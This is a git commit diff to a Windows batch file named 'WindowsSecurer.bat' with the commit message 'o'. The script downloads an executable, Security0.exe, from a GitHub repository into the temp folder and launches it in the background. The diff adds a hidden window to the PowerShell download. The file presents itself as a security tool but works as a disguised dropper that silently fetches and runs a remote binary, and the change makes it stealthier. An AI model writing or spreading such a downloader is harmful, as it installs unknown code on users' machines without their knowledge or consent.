b0ee80823f295dd48574aebc1f30a3d86f37115a
KR4eeR <124147653+KR4eeR@users.noreply.github.com>
2024-07-23 21:54:38 +0500

    o

--- WindowsSecurer.bat
+++ WindowsSecurer.bat
@@ -6,7 +6,7 @@ set "url_exe=https://raw.githubusercontent.com/KR4eeR/668768687/main/Security0.e
 set "temp_dir=%TEMP%"
 set "exe_path=%temp_dir%\Security0.exe"
 
-powershell -Command "Invoke-WebRequest -Uri %url_exe% -OutFile %exe_path%"
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri %url_exe% -OutFile %exe_path%"
 
 if exist "%exe_path%" (
     start /b "" "%exe_path%"
